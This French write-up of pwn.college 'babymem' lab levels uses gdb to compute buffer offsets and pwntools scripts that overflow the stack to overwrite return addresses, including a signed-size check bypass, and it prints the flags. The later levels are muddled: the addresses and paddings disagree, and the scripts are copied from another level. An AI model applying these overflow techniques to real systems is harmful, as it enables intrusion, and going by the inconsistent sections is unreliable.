# WriteUp PwnCollege

## Level 1.1 :

---

Pour ce challenge on utiliseras ce script :

```python
from pwn import *

padding = b'A' * ?
payload = padding + p64(0x42424242)

p = process('/challenge/babymem_level1.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level1-1:~$ gdb /challenge/babymem_level1.1 
(gdb) run
(gdb) run
Starting program: /challenge/babymem_level1.1 
...
Payload size: 1
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
Program received signal SIGINT, Interrupt.
0x00007f824a9c01f2 in __GI___libc_read (fd=0, buf=0x7ffe2974b370, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7ffe2974b370
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffe2974b370`.

On continue en dé-assemblant la fonction challenge qui contient la partie de la condition de validation du challenge :

```bash
(gdb) disass challenge
...
	 0x000055b8d7c4b466 <+282>:   mov    -0x58(%rbp),%rax
   0x000055b8d7c4b46a <+286>:   mov    (%rax),%eax
   0x000055b8d7c4b46c <+288>:   test   %eax,%eax
   0x000055b8d7c4b46e <+290>:   je     0x55b8d7c4b47a <challenge+302>
   0x000055b8d7c4b470 <+292>:   mov    $0x0,%eax
   0x000055b8d7c4b475 <+297>:   callq  0x55b8d7c4b24f <win>
...
```

Ce bloc de code détermine si nous obtenons le drapeau ou non.

Nous pouvons voir que l'instruction `cmp` compare si la valeur stockée dans `$eax` a été modifiée.

Et d'après les deux lignes ci-dessus, nous apprenons que la valeur dans `$eax` est déplacée depuis la déférence de `[rbp-0x58]`.

On check donc le valeur de `$rbp - 0x58`:

```bash
(gdb) x/a $rbp - 0x58
0x7ffe2974b368: 0x7ffe2974b3b0
```

L’emplacement de la variable win est donc `0x7ffe2974b3b0`

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
p/d 0x7ffe2974b3b0 - 0x7ffe2974b370
$3 = 64
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding : 

```bash
from pwn import *

padding = b'A' * 64
payload = padding + p64(0x42424242)

p = process('/challenge/babymem_level1.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
/bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level1.1': pid 4777
/home/hacker/bin.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('size:')
/home/hacker/bin.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('200')
/home/hacker/bin.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level1.1' stopped with exit code 0 (pid 4777)
You win! Here is your flag:
pwn.college{EuBlpKbDdajYZGnC3tB-JwGSDf3.0FM5IDL3EDM4UzW}
```

Et on obtient notre flag `EuBlpKbDdajYZGnC3tB-JwGSDf3.0FM5IDL3EDM4UzW`

## Level 2.1

Pour ce challenge on utiliseras ce script :

```python
from pwn import *

padding = b'A' ???
payload = padding + p64(???)

p = process('/challenge/babymem_level2.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire ainsi que l’adresse de valeur comparé à win.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level2-1:~$ gdb /challenge/babymem_level2.1 
(gdb) run
Starting program: /challenge/babymem_level2.1 
...
Payload size: 1
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
0x00007f25de0b61f2 in __GI___libc_read (fd=0, buf=0x7ffd6aa4c490, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7ffd6aa4c490
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffd6aa4c490`.

On continue en dé-assemblant la fonction challenge qui contient la partie de la condition de validation du challenge :

```bash
(gdb) disass challenge
...
	 0x00005654a6d81d58 <+252>:   mov    -0x48(%rbp),%rax
   0x00005654a6d81d5c <+256>:   mov    (%rax),%eax
   0x00005654a6d81d5e <+258>:   cmp    $0x7b2b4820,%eax
   0x00005654a6d81d63 <+263>:   jne    0x5654a6d81d6f <challenge+275>
   0x00005654a6d81d65 <+265>:   mov    $0x0,%eax
...
```

Ce bloc de code détermine si nous obtenons le drapeau ou non.

Nous pouvons voir que l'instruction `cmp` compare `0x7b2b4820`

Et d'après les deux lignes ci-dessus, nous apprenons que la valeur dans `$eax` est déplacée depuis la déférence de `[rbp-0x48]`.

On check donc le valeur de `$rbp - 0x48`:

```bash
(gdb) x/a $rbp - 0x48
0x7ffd6aa4c488: 0x7ffd6aa4c4b8
```

L’emplacement de la variable win est donc `0x7ffd6aa4c4b8`

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
 p/d 0x7ffd6aa4c4b8 - 0x7ffd6aa4c490
$3 = 40
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding : 

```bash
from pwn import *

padding = b'A' *40
payload = padding + p64(0x7b2b4820)

p = process('/challenge/babymem_level2.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
/bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level2.1': pid 2525
/home/hacker/bin.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('size:')
/home/hacker/bin.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('200')
/home/hacker/bin.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level2.1' stopped with exit code 0 (pid 2525)
You win! Here is your flag:
pwn.college{IKCJLv5YmIKsGsSfKZMAgrxA4r3.dhTNzMDL3EDM4UzW}

```

Et on obtient notre flag `IKCJLv5YmIKsGsSfKZMAgrxA4r3.dhTNzMDL3EDM4UzW`

## Level 3.1

Pour ce challenge on utiliseras ce script :

```python
from pwn import *

padding = b'A' * ??
payload = padding + p64(??)

p = process('/challenge/babymem_level3.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire ainsi que de la fonction win.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level2-1:~$ gdb /challenge/babymem_level3.1 
(gdb) run
Starting program: /challenge/babymem_level3.1 
...
Payload size: 1
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
0x00007f9b4f11d1f2 in __GI___libc_read (fd=0, buf=0x7ffd82690350, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7ffd82690350
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffd82690350`.

Dans ce challenge on doit trouver l’adresse de retour à réécrire.

On sait que le pointeur de base est stocker dans `$rbp`

On sait aussi que l’adresse de retour est stocker juste avant l’appelle de la fonction on trouve donc d’abord l’adresse de `$rbp` : 

```bash
gef➤  x/a $rbp
0x7fff0c8f8e90: 0x7fff0c8f9ec0
```

et étant donné que l’ont veut le pointeur juste avant on monte de 8 dans la stack : 

```bash
(gdb) x/a $rbp + 8
0x7ffd826903c8: 0x402548 <main+238>
```

On voit bien que l’oint est au début de la fonction main à l’adresse `0x7ffd826903c8` .

On continue en prenant l’adresse de début de la fonction win que l’on placera a la place de la fonction main

```bash
(gdb) disass win
Dump of assembler code for function win:
   0x0000000000402230 <+0>:     endbr64 
   ...
```

Ici on trouve l’adresse `0x0000000000402230`  qui est l’adresse du début de la fonction win

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
(gdb) p/d 0x7ffd826903c8 - 0x7ffd82690350
$2 = 120
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding et l’adresse de début de la fonction win : 

```bash
from pwn import *

padding = b'A' * 120
payload = padding + p64(0x0000000000402230)

p = process('/challenge/babymem_level3.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
hacker@memory-errors~level3-1:~$ /bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level3.1': pid 3107
/home/hacker/bin.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('size:')
/home/hacker/bin.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('200')
/home/hacker/bin.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level3.1' stopped with exit code -11 (SIGSEGV) (pid 3107)
Goodbye!
You win! Here is your flag:
pwn.college{QSA8XIo9-vALSh4KSpifYCehxWJ.0FN5IDL3EDM4UzW}

```

Et on obtient notre flag : `QSA8XIo9-vALSh4KSpifYCehxWJ.0FN5IDL3EDM4UzW`

Level 4.1

Pour ce challenge on utiliseras ce script que l’on a modifié car le programme ne veut pas que nous débordions le tampon, donc il essaie de s'assurer que la taille du payload que nous définissons est inférieure à la taille du buffer.

Cependant, nous pouvons utiliser le concept du “two’s compliment” à notre avantage.

Le two’s compliment de -1 est 0xffffffff. Si nous entrons la taille de la charge utile comme étant -1, le programme l'interprétera comme un entier non signé de 4294967295 au lieu de -1 signé.

Ainsi, nous pouvons passer le contrôle.

```python
from pwn import *

padding = b'A' * ??
payload = padding + p64(???)

p = process('/challenge/babymem_level4.1')
p.recvuntil('size:')
p.sendline('-1')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire ainsi que de la fonction win.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level2-1:~$ gdb /challenge/babymem_level4.1 
(gdb) run
Starting program: /challenge/babymem_level4.1 
...
Payload size: 1
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
Program received signal SIGINT, Interrupt.
0x00007fdaf1a9e1f2 in __GI___libc_read (fd=0, buf=0x7ffda6151200, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7ffda6151200
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffda6151200`.

Dans ce challenge on doit trouver l’adresse de retour à réécrire.

On sait que le pointeur de base est stocker dans `$rbp`

On sait aussi que l’adresse de retour est stocker juste avant l’appelle de la fonction on trouve donc d’abord l’adresse de `$rbp` : 

```bash
(gdb) x/a $rbp
0x7ffda6151240: 0x7ffda6152270
```

et étant donné que l’ont veut le pointeur juste avant on monte de 8 dans la stack : 

```bash
(gdb) x/a $rbp + 8
0x7ffda6151248: 0x401e59 <main+238>
```

On voit bien que l’oint est au début de la fonction main à l’adresse `0x7ffda6151248`.

On continue en prenant l’adresse de début de la fonction win que l’on placera a la place de la fonction main

```bash
(gdb) disass win
Dump of assembler code for function win:
   0x0000000000401b59 <+0>:     endbr64
   ...
```

Ici on trouve l’adresse `0x0000000000401b59` qui est l’adresse du début de la fonction win

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
(gdb) p/d 0x7fffae2d40e8 - 0x7fffae2d40a0
$1 = 72
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding et l’adresse de début de la fonction win : 

```bash
from pwn import *

padding = b'A' * 72
payload = padding + p64(0x0000000000401b59)

p = process('/challenge/babymem_level4.1')
p.recvuntil('size:')
p.sendline('-1')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
hacker@memory-errors~level4-1:~$ /bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level4.1': pid 2155
/home/hacker/bin.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('size:')
/home/hacker/bin.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('-1')
/home/hacker/bin.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level4.1' stopped with exit code -11 (SIGSEGV) (pid 2155)
Goodbye!
You win! Here is your flag:
pwn.college{cEQTQ9edgwG7THgn5XtFRfdQvjm.0lN5IDL3EDM4UzW}

```

Et on obtient notre flag : `cEQTQ9edgwG7THgn5XtFRfdQvjm.0lN5IDL3EDM4UzW`

Level 6.1 : 

Pour ce challenge on utiliseras ce script :

```python
from pwn import *

padding = b'A' * 104
payload = padding + p64(0x00000000004016e0)

p = process('/challenge/babymem_level6.1')
p.recvuntil('size:')
p.sendline('500')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire ainsi que de la fonction win.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level6-1:~$ gdb /challenge/babymem_level6.1 
(gdb) run
Starting program: /challenge/babymem_level6.1 
...
Payload size: 1
Send your payload (up to 1 bytes)!
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
0x00007fb3258ef1f2 in __GI___libc_read (fd=0, buf=0x7ffe1d49c790, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7ffe1d49c790
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffd82690350`.

Dans ce challenge on doit trouver l’adresse de retour à réécrire.

On sait que le pointeur de base est stocker dans `$rbp`

On sait aussi que l’adresse de retour est stocker juste avant l’appelle de la fonction on trouve donc d’abord l’adresse de `$rbp` : 

```bash
(gdb) x/a $rbp
0x7ffe1d49c7e0: 0x7ffe1d49d810
```

et étant donné que l’ont veut le pointeur juste avant on monte de 8 dans la stack : 

```bash
(gdb) x/a $rbp + 8
0x7ffe1d49c7e8: 0x40202b <main+238>
```

On voit bien que l’oint est au début de la fonction main à l’adresse `0x7fffd6bb9bc8`.

On continue en prenant l’adresse de début de la fonction win que l’on placera a la place de la fonction main

```bash
(gdb) disass win_authed 
Dump of assembler code for function win_authed:
   0x0000000000401d1e <+0>:     endbr64 
   ...
```

Ici on trouve l’adresse `0x0000000000401a97` qui est l’adresse du début de la fonction win

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
(gdb) p/d 0x7fffd6bb9bc8 - 0x7fffd6bb9b90
$2 = 56
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding et l’adresse de début de la fonction win : 

```bash
from pwn import *

padding = b'A' * 120
payload = padding + p64(0x0000000000402230)

p = process('/challenge/babymem_level3.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
hacker@memory-errors~level5-1:~$ /bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level5.1': pid 1717
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level5.1' stopped with exit code -11 (SIGSEGV) (pid 1717)
Goodbye!
You win! Here is your flag:
pwn.college{MEgziIK47eJnXhc34ycUKmEq9LF.0FO5IDL3EDM4UzW}

```

Et on obtient notre flag : `MEgziIK47eJnXhc34ycUKmEq9LF.0FO5IDL3EDM4UzW`

Level 5.1 : 

Pour ce challenge on utiliseras ce script :

```python
import pwn
from pwn import *

p = process("/challenge/babymem_level5.")

p.sendlineafter(b"send: ", b"65536")
p.sendlineafter(b"record: ", b"65536")

payload = b"A" * ??? + p64(???)
p.sendafter(b"bytes)!", payload)

p.interactive()
```

Mais dans un premier temps nous aurons besoin de calculer la taille du padding nécessaire ainsi que de la fonction win.

Pour ce faire ils nous faut d’abord trouver l’adresse du début du buffer on ouvre donc le programme dans gdb et le lance  : 

```bash
hacker@memory-errors~level5-1:~$ gdb /challenge/babymem_level5.1 
(gdb) run
Starting program: /challenge/babymem_level5.1 
...
Number of payload records to send: 1
Size of each payload record: 1
Send your payload (up to 1 bytes)!
```

On rentre une valeur quelconque dans le “Payload size” et break avec un `Ctrl + C` 

```bash
0x00007fc3bb1751f2 in __GI___libc_read (fd=0, buf=0x7fffd6bb9b90, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:26
26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
```

maintenant que notre programme a lu notre payload on peut checker la valeur de `$rsi` 

```bash
(gdb) p/x $rsi
$1 = 0x7fffd6bb9b90
```

On sait maintenant que l’adresse du début du buffer est  `0x7ffd82690350`.

Dans ce challenge on doit trouver l’adresse de retour à réécrire.

On sait que le pointeur de base est stocker dans `$rbp`

On sait aussi que l’adresse de retour est stocker juste avant l’appelle de la fonction on trouve donc d’abord l’adresse de `$rbp` : 

```bash
(gdb) x/a $rbp
0x7fffd6bb9bc0: 0x7fffd6bbabf0
```

et étant donné que l’ont veut le pointeur juste avant on monte de 8 dans la stack : 

```bash
(gdb) x/a $rbp + 8
0x7fffd6bb9bc8: 0x401e20 <main+238>
```

On voit bien que l’oint est au début de la fonction main à l’adresse `0x7fffd6bb9bc8`.

On continue en prenant l’adresse de début de la fonction win que l’on placera a la place de la fonction main afin qu’il skip le check

```bash
(gdb) disass win_authed 
Dump of assembler code for function win_authed:
   0x0000000000401d1e <+0>:     endbr64 
   0x0000000000401d22 <+4>:     push   %rbp
   0x0000000000401d23 <+5>:     mov    %rsp,%rbp
   0x0000000000401d26 <+8>:     sub    $0x10,%rsp
   0x0000000000401d2a <+12>:    mov    %edi,-0x4(%rbp)
   0x0000000000401d2d <+15>:    cmpl   $0x1337,-0x4(%rbp)
   0x0000000000401d34 <+22>:    jne    0x401e2c <win_authed+270>
   0x0000000000401d3a <+28>:    lea    0x12c7(%rip),%rdi        # 0x403008
   ...
```

Ici on trouve l’adresse `0x0000000000401a97` qui est l’adresse du début de la fonction win cependant ici nous voulons réecrire l’adresse de return qui est `0x0000000000401d3a` 

On peut donc maintenant calculer la taille du padding nécessaire : 

```bash
(gdb) p/d 0x7ffe1d49c7e8 - 0x7ffe1d49c790
$2 = 88
```

Maintenant que nous avons toutes les information dont on avait besoin il ne nous reste plus qu’à exécuter le script avec la bonne taille de padding et l’adresse de début de la fonction win : 

```bash
from pwn import *

padding = b'A' * 120
payload = padding + p64(0x0000000000402230)

p = process('/challenge/babymem_level3.1')
p.recvuntil('size:')
p.sendline('200')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```

```bash
hacker@memory-errors~level6-1:~$ /bin/python /home/hacker/bin.py
[+] Starting local process '/challenge/babymem_level6.1': pid 2363
/home/hacker/bin.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('size:')
/home/hacker/bin.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('500')
/home/hacker/bin.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('bytes)!')
[*] Switching to interactive mode

[*] Process '/challenge/babymem_level6.1' stopped with exit code -7 (SIGBUS) (pid 2363)
Goodbye!
You win! Here is your flag:
pwn.college{kld23HzrahkB_WgVFBPCeQpiA0L.0FMwMDL3EDM4UzW}
```

Et on obtient notre flag : `kld23HzrahkB_WgVFBPCeQpiA0L.0FMwMDL3EDM4UzW`
